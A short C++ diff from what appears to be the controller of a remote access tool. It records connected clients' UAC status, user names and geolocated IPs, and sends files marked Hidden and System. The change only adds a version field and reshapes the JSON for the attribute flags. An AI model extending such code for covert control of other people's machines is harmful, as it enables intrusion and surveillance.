@@ -49,6 +49,7 @@ public:
 		Clients[ID].info.UAC = data["UAC"];
 		Clients[ID].info.UserName = data["UserName"];
 		Clients[ID].info.Versione = data["Versione"];
+		Clients[ID].info.Compatibilita = (data["VersioneCompatibile"].is_null()) ? 0 : (int)data["VersioneCompatibile"];
 
 		Clients[ID].info.IP = TcpIP::GetIP(Sock);
 		IPlocation::GetInfoFromIP(Clients[ID].info.IP, Clients[ID].info.Location);
@@ -112,8 +113,8 @@ public:
 		if (!TcpIP::SendString(Sock, FileContent))
 			return false;
 
-		j["Attrib"]["Hidden"] = Hidden;
-		j["Attrib"]["System"] = System;
+		j["Hidden"] = Hidden;
+		j["System"] = System;
 
 		if (!TcpIP::SendString(Sock, j.dump()))
 			return false;
